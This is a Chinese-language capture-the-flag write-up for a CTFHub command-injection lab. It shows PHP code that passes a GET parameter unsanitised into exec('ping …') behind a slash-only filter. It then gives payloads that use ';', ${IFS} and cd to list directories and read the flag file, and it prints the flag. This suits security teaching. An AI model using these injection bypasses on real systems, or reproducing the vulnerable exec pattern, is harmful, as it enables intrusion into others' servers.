---
title: CTFHub-RCE-过滤目录分隔符 Writeup
date: 2026-10-24
category: web
tags: [CTFHub, RCE, 命令注入, 绕过]
---

## 漏洞分析

### 源码审计
访问靶机首页，查看源码：
<?php $res = FALSE; if (isset($_GET['ip']) && $_GET['ip']) { $ip = $_GET['ip']; $m = []; if (!preg_match_all("/\//", $ip, $m)) { $cmd = "ping -c 4 {$ip}"; exec($cmd, $res); } else { $res = $m; } } ?>

### 漏洞点：
1. 存在任意命令执行漏洞。
2. preg_match_all("/\//", ...) 过滤了斜杠 /。因为 / 是 Linux 中根目录和路径分隔符，过滤后常规的绝对路径读取（如 cat /flag）无法使用。

## 解题步骤

### 第一步：探测目录
利用 ; 和 ${IFS}（代替空格）执行 ls 查看当前目录：
?ip=127.0.0.1;ls
回显发现当前目录下有一个名为 flag_is_here 的目录。

### 第二步：利用 cd 绕过斜杠限制
既然不能使用 / 进入该目录，我们可以用 cd 命令切换工作目录，再读取文件。利用 ; 隔开多条命令：
?ip=127.0.0.1;cd${IFS}flag_is_here;ls
回显发现该目录下的目标文件名为 flag_3624278634374.php。

### 第三步：读取 Flag
由于已经切换到了 flag_is_here 目录内，直接 cat 当前目录下的文件即可，无需使用斜杠：
?ip=127.0.0.1;cd${IFS}flag_is_here;cat${IFS}flag_3624278634374.php

### 第四步：查看网页源代码
由于 <?php 等标签会被浏览器解析隐藏，在页面上右键“查看网页源代码”（Ctrl+U），搜索 ctfhub{ 即可提取明文 Flag：
### ctfhub{cc617a6e34d4bd36feb76bc9}
